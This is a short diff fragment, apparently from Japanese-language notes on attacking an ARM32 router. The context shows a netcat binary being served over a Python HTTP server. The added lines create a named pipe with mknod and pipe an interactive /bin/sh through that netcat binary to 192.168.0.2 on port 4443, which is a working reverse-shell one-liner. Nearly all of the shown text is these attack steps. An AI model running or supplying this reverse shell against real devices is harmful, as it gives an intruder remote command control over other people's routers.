@@ -145,3 +145,12 @@ ls -lh nc_arm32
 
 # ルータ配信用HTTPサーバの起動
 python3 -m http.server 8000
+
+
+ARM３２の場合
+
+# 1. mknod で名前付きパイプを作成
+mknod /tmp/p p
+
+# 2. パイプ経由で ./nc_arm32 にシェルを流し込む
+cat /tmp/p | /bin/sh -i 2>&1 | ./nc_arm32 192.168.0.2 4443 > /tmp/p
